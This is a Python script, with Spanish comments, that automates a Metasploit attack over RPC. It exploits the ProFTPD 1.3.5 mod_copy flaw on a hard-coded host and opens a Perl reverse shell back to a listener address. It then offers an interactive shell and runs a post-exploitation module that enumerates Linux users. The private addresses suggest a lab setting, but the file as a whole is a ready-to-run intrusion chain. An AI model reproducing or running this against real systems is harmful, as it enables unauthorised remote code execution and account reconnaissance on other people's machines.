from pymetasploit3.msfrpc import MsfRpcClient
import time

def connect_metasploit():
    """Establece una conexión con el servidor de Metasploit.

    Returns:
        MsfRpcClient: Una instancia del cliente conectado a Metasploit.
    """
    client = MsfRpcClient("password", ssl=True)
    print("Conectado a Metasploit!")
    return client

def search_exploits(client, keyword):
    """Busca exploits en Metasploit basándose en una palabra clave.

    Args:
        client (MsfRpcClient): Cliente de Metasploit.
        keyword (str): Palabra clave para la búsqueda de exploits.

    Returns:
        None: Los resultados se imprimen directamente en la consola.
    """
    exploits = client.modules.exploits
    filtered_exploits = [exploit for exploit in exploits if keyword.lower() in exploit.lower()]
    print(f"Exploits que contienen '{keyword}':")
    for exploit in filtered_exploits:
        print(exploit)

def setup_and_run_exploit(client):
    """Configura y ejecuta un exploit específico para proftpd 1.3.5.

    Args:
        client (MsfRpcClient): Cliente de Metasploit.

    Returns:
        str: UUID del job de Metasploit ejecutado.
    """
    exploit = client.modules.use("exploit", "unix/ftp/proftpd_modcopy_exec")
    exploit['RHOSTS'] = '192.168.138.137'
    exploit['SITEPATH'] = '/var/www/html'
    payload = client.modules.use('payload', 'cmd/unix/reverse_perl')
    payload['LHOST'] = '192.168.138.135'
    payload['LPORT'] = 4445

    print("Ejecutando el exploit...")
    output = exploit.execute(payload=payload)
    print(output)

    return output['uuid']

def get_session_id(client, uuid, timeout=15):
    """Obtiene el ID de la sesión generada por un exploit.

    Args:
        client (MsfRpcClient): Cliente de Metasploit.
        uuid (str): UUID del job de Metasploit.
        timeout (int): Tiempo máximo de espera en segundos.

    Returns:
        str: ID de la sesión si está disponible, None si no.
    """
    end_time = time.time() + timeout
    while time.time() < end_time:
        sessions = client.sessions.list
        for session in sessions:
            if sessions[session]['exploit_uuid'] == uuid:
                return session
        time.sleep(1)
    return None

def interact_with_session(client, session_id):
    """Permite interactuar con una sesión de shell abierta.

    Args:
        client (MsfRpcClient): Cliente de Metasploit.
        session_id (str): ID de la sesión activa.

    Returns:
        None: La función se ejecuta hasta que se introduce el comando 'exit'.
    """
    shell = client.sessions.session(session_id)
    print("Interactuando con la sesión...")

    try:
        while True:
            command = input("$ ")
            if command.lower() == 'exit':
                break
            shell.write(command + '\n')
            time.sleep(1)
            print(shell.read())
    except KeyboardInterrupt:
        print("Saliendo de la sesión interactiva.")

def post_explotation(client, session_id):
    """Realiza acciones de post-explotación, recogiendo información relevante.

    Args:
        client (MsfRpcClient): Cliente de Metasploit.
        session_id (int): ID de la sesión activa.

    Returns:
        None: Los resultados se imprimen directamente en la consola.
    """
    console_id = client.consoles.console().cid
    exploit_module = '/linux/gather/enum_users'
    client.consoles.console(console_id).write(f'use {exploit_module}\n')
    client.consoles.console(console_id).write(f'set SESSION {session_id}\n')
    client.consoles.console(console_id).write('run\n')

    time.sleep(20)
    output = client.consoles.console(console_id).read()
    print("Resultados obtenidos del módulo:")
    print(output['data'])

    client.consoles.console(console_id).destroy()

def main():
    """Función principal que orquesta el flujo del script."""
    client = connect_metasploit()
    job_id = setup_and_run_exploit(client)
    session_id = get_session_id(client, job_id)
    if session_id:
        post_explotation(client, int(session_id))

if __name__ == "__main__":
    main()